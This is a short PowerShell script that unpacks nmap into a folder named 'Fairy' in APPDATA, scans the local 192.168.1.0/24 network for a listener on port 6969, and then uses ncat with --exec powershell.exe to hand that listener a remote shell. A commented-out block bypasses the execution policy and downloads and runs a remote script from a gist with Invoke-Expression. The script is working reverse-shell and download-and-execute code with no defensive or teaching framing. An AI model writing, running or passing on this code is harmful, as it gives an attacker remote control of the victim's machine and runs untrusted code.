# create folder
Write-Output "Creating Fairy"
New-Item $env:APPDATA -Name "Fairy" -ItemType "Directory" -Force
Write-Output "Created Fairy"

# change directory into Fairy to download and unzip file

# extract nmap
Write-Output "Extracting File"
Expand-Archive -LiteralPath ".\nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force
Write-Output "File Extracted"

# change directory into executables folder
Write-Output "Changing Directory"
Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
Write-Output "Directory Changed"

# scan for listening port 6969 on network
Write-Output "Scanning for port"
$ScanOutput = .\nmap.exe -p 6969 -T5 -n 192.168.1.0/24 --open
Write-Output "Scan Finished"

# get ip of listener
Write-Output "Getting IP"
$string = $ScanOutput -match "192\.168\.1\.\w+"
$ListenerIP = $string.Substring(21)
Write-Output "IP Extracted"

# wait a while
Write-Output "Waiting"
Start-Sleep -Seconds 5
Write-Output "Wait Finished"


# connect to listener
Write-Output "Connecting to listener"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969

<#
Set-ExecutionPolicy Bypass -Scope Process -Force;
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
Invoke-Expression "&{$((New-Object System.Net.WebClient).DownloadString('https://gist.github.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/getlink.ps1'))} global"
#>

